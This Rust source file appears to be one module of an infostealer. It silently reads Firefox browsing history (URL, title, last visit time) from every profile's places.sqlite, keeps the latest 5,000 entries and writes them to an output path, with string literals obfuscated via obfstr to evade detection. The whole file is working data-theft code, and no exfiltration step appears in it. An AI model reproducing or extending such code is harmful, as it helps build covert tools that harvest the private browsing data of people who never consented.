use crate::alloc::borrow::ToOwned;
use alloc::sync::Arc;
use tasks::{parent_name, Task};
use utils::path::Path;
use crate::gecko::GeckoBrowserData;
use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, History};
use obfstr::obfstr as s;
use database::TableRecord;

const MOZ_PLACES_URL: usize = 1;
const MOZ_PLACES_TITLE: usize = 2;
const MOZ_PLACES_LAST_VISIT_DATE: usize = 8;

pub(super) struct HistoryTask<'a> {
    browser: Arc<GeckoBrowserData<'a>>
}

impl<'a> HistoryTask<'a> {
    pub(super) fn new(browser: Arc<GeckoBrowserData<'a>>) -> Self {
        Self { browser }
    }
}

impl Task for HistoryTask<'_> {
    parent_name!("History");
    
    unsafe fn run(&self, parent: &Path) {
        let Some(mut history) = collect_and_read_sqlite_from_all_profiles(
            &self.browser.profiles,
            |profile| profile / s!("places.sqlite"),
            s!("moz_places"),
            extract_history_from_record
        ) else {
            return
        };
        
        history.sort_by(|a, b| b.last_visit_time.cmp(&a.last_visit_time));
        history.truncate(5000);
        
        let _ = to_string_and_write_all(&history, "\n\n", parent);
    }
}

fn extract_history_from_record(record: &dyn TableRecord) -> Option<History> {
    let url = record.get_value(MOZ_PLACES_URL)?.as_string()?.to_owned();
    let title = record.get_value(MOZ_PLACES_TITLE)?.as_string()?.to_owned();
    let last_visit_time = record.get_value(MOZ_PLACES_LAST_VISIT_DATE)?.as_integer()?.to_owned();
    
    Some(History {
        url,
        title,
        last_visit_time
    })
}